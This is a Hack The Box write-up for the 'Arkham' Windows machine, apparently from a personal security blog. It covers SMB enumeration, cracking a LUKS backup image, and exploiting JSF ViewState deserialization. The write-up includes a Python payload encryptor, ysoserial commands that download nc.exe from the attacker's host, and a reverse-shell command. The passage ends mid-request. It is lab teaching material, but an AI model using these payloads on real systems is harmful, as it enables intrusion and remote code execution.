@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Hack The Box - Arkham | 0xRick</title>
+<meta name="generator" content="Jekyll v3.8.5" />
+<meta property="og:title" content="Hack The Box - Arkham" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="My write-up for Arkham from Hack The Box." />
+<meta property="og:description" content="My write-up for Arkham from Hack The Box." />
+<link rel="canonical" href="https://0xrick.github.io/hack-the-box/arkham/" />
+<meta property="og:url" content="https://0xrick.github.io/hack-the-box/arkham/" />
+<meta property="og:site_name" content="0xRick" />
+<meta property="og:image" content="https://0xrick.github.io/hackthebox/arkham/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-08-10T00:00:00+02:00" />
+<script type="application/ld+json">
+{"description":"My write-up for Arkham from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/arkham/","image":"https://0xrick.github.io/hackthebox/arkham/0.png","headline":"Hack The Box - Arkham","dateModified":"2019-08-10T00:00:00+02:00","datePublished":"2019-08-10T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/arkham/"},"@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
+</head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2');
+</script>
+
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/"><i class="fab fa-twitter-square"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/"><i class="fab fa-facebook-square"></i></a><a class="color-purple-hover" href="https://github.com/0xRick"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="author-box">
+<img src="/avatar.png" class="author-avatar" />
+<h7>
+	Ahmed Hesham<br>
+	CyberSec/InfoSec enthusiast. <br>
+	Interested in knowing how things work/Interested in breaking them, always learning.
+</h7>
+</div>
+
+  <br>
+<div>
+	<h7>  &nbsp; Ad </h7>
+	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</div>
+<div class="post">
+  <h1 class="post-title">Hack The Box - Arkham</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/windows/">windows</a>
+      
+      <a class="tag" href="/tag/web/">web</a>
+      
+      <a class="tag" href="/tag/rce/">rce</a>
+      
+      <a class="tag" href="/tag/python/">python</a>
+      
+      <a class="tag" href="/tag/exploit-development/">exploit-development</a>
+      
+      <a class="tag" href="/tag/smb/">smb</a>
+      
+      <a class="tag" href="/tag/cryptography/">cryptography</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 10 Aug 2019</div>
+  
+  <div class="post-description">My write-up for Arkham from Hack The Box.</div>
+  
+  <hr />
+
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys today Arkham retired and here’s my write-up about it. This box was a challenging one and I enjoyed it a lot, it had an interesting java deserialization vulnerability which is the best thing about this box. Despite the fact that some parts were annoying, this box was great. It’s a Windows box and its ip is <code class="highlighter-rouge">10.10.10.130</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">arkham.htb</code>. Let’s jump right in !
+<img src="/images/hackthebox/arkham/0.png" alt="" /></p>
+<hr />
+
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
+<code class="highlighter-rouge">nmap -sV -sT -sC arkham.htb</code>
+<img src="/images/hackthebox/arkham/1.png" alt="" />
+<br /> We have <code class="highlighter-rouge">http</code> on port 80, 8080 and <code class="highlighter-rouge">smb</code>, I checked <code class="highlighter-rouge">smb</code> first.
+<br /></p>
+<hr />
+
+<h2 id="smb">SMB</h2>
+<p><br /> Let’s use <code class="highlighter-rouge">smbclient</code> to list the shares :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham# smbclient --list //arkham.htb/ -U ""
+Enter WORKGROUP\'s password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        BatShare        Disk      Master Wayne's secrets
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to arkham.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+</code></pre></div></div>
+<p><br /> <code class="highlighter-rouge">Users</code> is an interesting share name, I checked it and it had the directories for <code class="highlighter-rouge">Guest</code> and <code class="highlighter-rouge">default</code> users :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham# smbclient //arkham.htb/Users/ -U ""
+Enter WORKGROUP\'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                  DR        0  Sun Feb  3 15:24:10 2019
+  ..                                 DR        0  Sun Feb  3 15:24:10 2019
+  Default                           DHR        0  Fri Feb  1 04:49:06 2019
+  desktop.ini                       AHS      174  Sat Sep 15 09:16:48 2018
+  Guest                               D        0  Sun Feb  3 15:24:19 2019
+
+                5158399 blocks of size 4096. 1899220 blocks available
+smb: \&gt; 
+</code></pre></div></div>
+<p><br /> I enumerated it for some time but I couldn’t find anything useful so I checked <code class="highlighter-rouge">BatShare</code> which had a <code class="highlighter-rouge">zip</code> archive called <code class="highlighter-rouge">appserver.zip</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham# smbclient //arkham.htb/BatShare -U ""
+Enter WORKGROUP\'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun Feb  3 15:00:10 2019
+  ..                                  D        0  Sun Feb  3 15:00:10 2019
+  appserver.zip                       A  4046695  Fri Feb  1 08:13:37 2019
+
+                5158399 blocks of size 4096. 1897320 blocks available
+smb: \&gt; 
+</code></pre></div></div>
+<p><br /> I downloaded it (<code class="highlighter-rouge">get appserver.zip</code>) then I started to examine it.
+<br /></p>
+<hr />
+
+<h2 id="decrypting-the-backup-image-luks-encrypted-image">Decrypting the Backup Image (LUKS Encrypted Image)</h2>
+<p><br /> After unzipping <code class="highlighter-rouge">appserver.zip</code> I got 2 files, <code class="highlighter-rouge">IMPORTANT.txt</code> and <code class="highlighter-rouge">backup.img</code></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham# mkdir appserver
+root@kali:~/Desktop/HTB/boxes/arkham# cd appserver/
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# mv ../appserver.zip .
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# unzip appserver.zip 
+Archive:  appserver.zip
+  inflating: IMPORTANT.txt           
+  inflating: backup.img              
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# ls -la
+total 17276
+drwxr-xr-x 2 root root     4096 Aug  9 01:04 .
+drwxr-xr-x 3 root root     4096 Aug  9 01:04 ..
+-rw-r--r-- 1 root root  4046695 Aug  9 01:03 appserver.zip
+-rw-r--r-- 1 root root 13631488 Dec 25  2018 backup.img
+-rw-r--r-- 1 root root      149 Dec 25  2018 IMPORTANT.txt
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
+</code></pre></div></div>
+<p><br /> <code class="highlighter-rouge">IMPORTANT.txt</code> was a note from <code class="highlighter-rouge">Bruce</code> to <code class="highlighter-rouge">Alfred</code> telling him that this is the backup image from their Linux server :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/appserver# cat IMPORTANT.txt 
+Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce 
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
+</code></pre></div></div>
+<p><br /> <code class="highlighter-rouge">Backup.img</code> was a <code class="highlighter-rouge">LUKS</code> encrypted image :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/appserver# file backup.img 
+backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
+</code></pre></div></div>
+<p><br /> We can attempt to open it with <code class="highlighter-rouge">cryptsetup</code> but of course we will need a password :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/appserver# cryptsetup open --type luks backup.img test
+Enter passphrase for backup.img:
+</code></pre></div></div>
+<p><br /> We can use a tool called <code class="highlighter-rouge">bruteforce-luks</code> to bruteforce the password, but using it with <code class="highlighter-rouge">rockyou</code> would take a very long time. The box so far has a lot of batman references, like the names <code class="highlighter-rouge">Alfred</code>, <code class="highlighter-rouge">Bruce</code>, <code class="highlighter-rouge">Joker</code>  and the share name <code class="highlighter-rouge">BatShare</code>, also the comment of that share : <code class="highlighter-rouge">Master Wayne's secrets</code>. 
+<br /> I took all the passwords from <code class="highlighter-rouge">rockyou</code> that had <code class="highlighter-rouge">batman</code> in them and created a custom list :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/appserver# grep batman /usr/share/wordlists/rockyou.txt &gt; list.txt
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# bruteforce-luks -f ./list.txt ./backup.img 
+Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
+
+Tried passwords: 60
+Tried passwords per second: 0.361446
+Last tried password: batmanforever
+
+Password found: batmanforever
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
+</code></pre></div></div>
+<p><br /> It worked and the password was <code class="highlighter-rouge">batmanforever</code>.
+<img src="/images/hackthebox/arkham/2.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/arkham/3.png" alt="" />
+<br /> It had a directory called <code class="highlighter-rouge">Mask</code> so I copied it then I unmounted the image.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/media/root/af474e94-894e-4bb6-897a-adc82884b3d8# ls -la
+total 18
+drwxr-xr-x  4 root root  1024 Dec 25  2018 .
+drwxr-x---+ 3 root root  4096 Aug  9 01:30 ..
+drwx------  2 root root 12288 Dec 25  2018 lost+found
+drwxrwxr-x  4 root root  1024 Dec 25  2018 Mask
+root@kali:/media/root/af474e94-894e-4bb6-897a-adc82884b3d8# cd -                             /root/Desktop/HTB/boxes/arkham/appserver
+root@kali:~/Desktop/HTB/boxes/arkham/appserver# cp -r /media/root/af474e94-894e-4bb6-897a-adc82884b3d8/Mask/ .
+root@kali:~/Desktop/HTB/boxes/arkham/appserver#
+</code></pre></div></div>
+<p><br /> There were some useless stuff that I didn’t really care about, there was a directory called <code class="highlighter-rouge">tomcat-stuff</code> which had some web server configuration files, that one was interesting.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask# ls -la
+total 896
+drwxr-xr-x 4 root root   4096 Aug  9 01:32 .
+drwxr-xr-x 3 root root   4096 Aug  9 01:32 ..
+drwxr-xr-x 2 root root   4096 Aug  9 01:32 docs
+-rw-r--r-- 1 root root  96978 Aug  9 01:32 joker.png
+-rw-r--r-- 1 root root 105374 Aug  9 01:32 me.jpg
+-rw-r--r-- 1 root root 687160 Aug  9 01:32 mycar.jpg
+-rw-r--r-- 1 root root   7586 Aug  9 01:32 robin.jpeg
+drwxr-xr-x 2 root root   4096 Aug  9 01:32 tomcat-stuff
+root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask# cd tomcat-stuff/
+root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/tomcat-stuff# ls -la
+total 212
+drwxr-xr-x 2 root root   4096 Aug  9 01:32 .
+drwxr-xr-x 4 root root   4096 Aug  9 01:32 ..
+-rw-r--r-- 1 root root   1368 Aug  9 01:32 context.xml
+-rw-r--r-- 1 root root    832 Aug  9 01:32 faces-config.xml
+-rw-r--r-- 1 root root   1172 Aug  9 01:32 jaspic-providers.xml
+-rw-r--r-- 1 root root     39 Aug  9 01:32 MANIFEST.MF
+-rw-r--r-- 1 root root   7678 Aug  9 01:32 server.xml
+-rw-r--r-- 1 root root   2208 Aug  9 01:32 tomcat-users.xml
+-rw-r--r-- 1 root root 174021 Aug  9 01:32 web.xml
+-rw-r--r-- 1 root root   3498 Aug  9 01:32 web.xml.bak
+root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/tomcat-stuff# cd ../docs
+root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/docs# ls -la
+total 204
+drwxr-xr-x 2 root root   4096 Aug  9 01:32 .
+drwxr-xr-x 4 root root   4096 Aug  9 01:32 ..
+-rw-r--r-- 1 root root 199998 Aug  9 01:32 Batman-Begins.pdf
+root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/docs# 
+</code></pre></div></div>
+<p><br /> We have the server configuration files, However we haven’t checked any of the <code class="highlighter-rouge">http</code> ports yet.
+<br /></p>
+<hr />
+
+<p><br /> HTTP Enumeration
+<br /> Port 80 had nothing running, there was only the default <code class="highlighter-rouge">IIS</code> index page and no subdirectories.
+<img src="/images/hackthebox/arkham/4.png" alt="" />
+<br /> On port 8080 there was a website with some links :
+<img src="/images/hackthebox/arkham/5.png" alt="" />
+<br /> One of the links was the subscription link : <code class="highlighter-rouge">http://arkham.htb:8080/userSubscribe.faces</code>
+<img src="/images/hackthebox/arkham/6.png" alt="" />
+<br /> I tested it to see what will happen :
+<img src="/images/hackthebox/arkham/7.png" alt="" />
+<br />
+<br />
+<img src="/images/hackthebox/arkham/8.png" alt="" />
+<br /> Nothing interesting, I intercepted the request with <code class="highlighter-rouge">burp</code> and found some interesting parameters in the POST request :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /userSubscribe.faces HTTP/1.1
+Host: arkham.htb:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://arkham.htb:8080/userSubscribe.faces
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 257
+Cookie: JSESSIONID=F018FBFC4605B1C80EB54D5CA2A46B91
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+j_id_jsp_1623871077_1%3Aemail=test&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;javax.faces.ViewState=wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D
+</code></pre></div></div>
+<p><br /></p>
+<hr />
+
+<h2 id="jsf-viewstate-deserialization-vulnerability">JSF ViewState Deserialization Vulnerability</h2>
+<p><br /> The page had <code class="highlighter-rouge">.faces</code> extension and the POST request had a parameter called <code class="highlighter-rouge">javax.faces.ViewState</code>. 
+<br /> After some research I knew that this parameter holds a java serialized object, this means that there is a potential deserialization vulnerability.
+<br /></p>
+
+<p><br /> Some resources if you are unfamiliar with deserialization vulnerabilities :</p>
+<ul>
+  <li><br /> <a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html">Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities</a></li>
+  <li><br /> <a href="https://www.n00py.io/2017/11/exploiting-blind-java-deserialization-with-burp-and-ysoserial/">Exploiting blind Java deserialization with Burp and Ysoserial</a></li>
+  <li><br /> <a href="https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a">How i found a 1500$ worth Deserialization vulnerability</a></li>
+  <li><br /> <a href="https://gist.github.com/cdowns71/76d99ad0829ceef3a83761dbeee3b66d">Encrypted Java Serialized RCE</a> (This helped me to know how to encrypt the data)</li>
+</ul>
+
+<p><br /></p>
+
+<p><br /> When I tried to decode the base-64 encoded value I got nothing readable:
+<img src="/images/hackthebox/arkham/9.png" alt="" />
+<br /> I redirected the output into a file and ran <code class="highlighter-rouge">file</code> command against it, and I got <code class="highlighter-rouge">data</code> instead of <code class="highlighter-rouge">Java serialization data</code>.
+<br /> This means that the serialized data are encrypted. Luckily we have the server configuration files, it’s time to check them.
+<br /> In <code class="highlighter-rouge">web.xml.bak</code> I found the key used to encrypt the data, also the MAC algorithm which was <code class="highlighter-rouge">hmac-sha1</code> and the used key.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ----------------
+     Removed Output
+    ----------------
+&lt;context-param&gt;     
+
+&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;                                                                     
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;                                                                                
+&lt;/context-param&gt;                                                                                                       
+    &lt;context-param&gt;                                                                                                    
+        &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;                                                      
+        &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;                                                                            
+     &lt;/context-param&gt;
+&lt;context-param&gt;
+&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/param-name&gt;
+&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;
+&lt;/context-param&gt;
+&lt;context-param&gt;
+    ----------------
+     Removed Output
+    ----------------
+</code></pre></div></div>
+<p><br /> The same key was used : <code class="highlighter-rouge">SnNGOTg3Ni0=</code>, it’s base-64 encoded so we need to decode it :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham# echo SnNGOTg3Ni0= | base64 -d
+JsF9876-
+</code></pre></div></div>
+<p><br /> The key is <code class="highlighter-rouge">JsF9876-</code>.
+<br /> We have everything we need to encrypt the data correctly, I wrote a python script to do it. 
+<br /> Basically I’m going to create the payload with <a href="https://github.com/frohoff/ysoserial"><code class="highlighter-rouge">ysoserial</code></a> then use my script to encrypt it.
+<br /> <code class="highlighter-rouge">viewstate.py</code> :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/python3</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">hmac</span>
+<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
+<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha1</span>
+<span class="kn">from</span> <span class="nn">pyDes</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">YELLOW</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[93m"</span>
+<span class="n">GREEN</span> <span class="o">=</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m"</span>
+
+<span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
+	<span class="n">cipher</span> <span class="o">=</span> <span class="n">des</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">ECB</span><span class="p">,</span> <span class="n">IV</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">pad</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">padmode</span><span class="o">=</span><span class="n">PAD_PKCS5</span><span class="p">)</span>
+	<span class="n">enc_payload</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	<span class="k">return</span> <span class="n">enc_payload</span>
+
+<span class="k">def</span> <span class="nf">hmac_sig</span><span class="p">(</span><span class="n">enc_payload</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
+	<span class="n">hmac_sig</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">enc_payload</span><span class="p">,</span> <span class="n">sha1</span><span class="p">)</span>
+	<span class="n">hmac_sig</span> <span class="o">=</span> <span class="n">hmac_sig</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+	<span class="k">return</span> <span class="n">hmac_sig</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="n">b</span><span class="s">'JsF9876-'</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">:</span>
+	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[!] Usage : {} [Payload File] [Output File]"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+<span class="k">else</span><span class="p">:</span>
+	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+		<span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+		<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[+] Encrypting payload"</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"  [!] Key : JsF9876-</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="n">enc_payload</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="n">key</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[+] Creating HMAC signature"</span><span class="p">)</span>
+	<span class="n">hmac_sig</span> <span class="o">=</span> <span class="n">hmac_sig</span><span class="p">(</span><span class="n">enc_payload</span><span class="p">,</span><span class="n">key</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[+] Appending signature to the encrypted payload</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="n">payload</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">enc_payload</span> <span class="o">+</span> <span class="n">hmac_sig</span><span class="p">)</span>
+	<span class="n">payload</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+	<span class="k">print</span><span class="p">(</span><span class="n">YELLOW</span> <span class="o">+</span> <span class="s">"[*] Final payload : {}</span><span class="se">\n</span><span class="s">"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+		<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+		<span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+	<span class="k">print</span><span class="p">(</span><span class="n">GREEN</span> <span class="o">+</span> <span class="s">"[*] Saved to : {}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
+</code></pre></div></div>
+<p><br /> This script has two functions, <code class="highlighter-rouge">encrypt()</code> and <code class="highlighter-rouge">hmac_sig()</code>, <code class="highlighter-rouge">encrypt()</code> takes the payload generated by <code class="highlighter-rouge">ysoserial</code> and <code class="highlighter-rouge">DES</code> encrypts it using the key then returns the encrypted payload. <code class="highlighter-rouge">hmac_sig()</code> takes the encrypted payload and generates the <code class="highlighter-rouge">hmac</code> signature that will be appended to the encrypted payload. 
+<br /> The script takes two arguments, first one is for the filename that contains the <code class="highlighter-rouge">ysoserial</code> generated payload, it encrypts it then generates the <code class="highlighter-rouge">hmac</code> signature, appends it to the encrypted payload, base-64 encodes the final payload and <code class="highlighter-rouge">url</code>-encodes it. Then it saves the payload into the output file which is the second argument.
+<br /> Time to use <code class="highlighter-rouge">ysoserial</code>,  we run into the problem of which payload to use, I used <code class="highlighter-rouge">CommonsCollections5</code> and it worked. 
+<br /> I created two payloads, first one is to download <code class="highlighter-rouge">nc.exe</code> from my box and save it in <code class="highlighter-rouge">C:\windows\system32\spool\drivers\color</code>, second one is to execute the reverse shell command : <code class="highlighter-rouge">nc.exe -e cmd.exe 10.10.xx.xx 1337</code></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham# java -jar ysoserial.jar CommonsCollections5 'cmd.exe /c powershell -c Invoke-WebRequest -Uri "http://10.10.xx.xx/nc.exe" -OutFile "C:\windows\system32\spool\drivers\color\nc.exe"' &gt; uploadnc.payload
+WARNING: An illegal reflective access operation has occurred
+WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/root/Desktop/HTB/boxes/arkham/ysoserial.jar) to field javax.management.BadAttributeValueExpException.val
+WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5
+WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
+WARNING: All illegal access operations will be denied in a future release
+root@kali:~/Desktop/HTB/boxes/arkham# java -jar ysoserial.jar CommonsCollections5 'cmd.exe /c "C:\windows\system32\spool\drivers\color\nc.exe" -e cmd.exe 10.10.xx.xx 1337' &gt; executenc.payload
+WARNING: An illegal reflective access operation has occurred
+WARNING: Illegal reflective access by ysoserial.payloads.CommonsCollections5 (file:/root/Desktop/HTB/boxes/arkham/ysoserial.jar) to field javax.management.BadAttributeValueExpException.val
+WARNING: Please consider reporting this to the maintainers of ysoserial.payloads.CommonsCollections5
+WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
+WARNING: All illegal access operations will be denied in a future release
+root@kali:~/Desktop/HTB/boxes/arkham# 
+</code></pre></div></div>
+<p><br /> Then I encrypted them with my script :
+<img src="/images/hackthebox/arkham/10.png" alt="" />
+<br /> I ran a python server to host <code class="highlighter-rouge">nc.exe</code> and I started my <code class="highlighter-rouge">nc</code> listener on port 1337, then I sent the payloads. 
+<br /> 1st Request :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /userSubscribe.faces HTTP/1.1
+Host: arkham.htb:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://arkham.htb:8080/userSubscribe.faces
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3197
+Cookie: JSESSIONID=FFA2F263EA4D3BCCFAAEEFBE012A524D
+Connection: close
+Upgrade-Insecure-Requests: 1
+
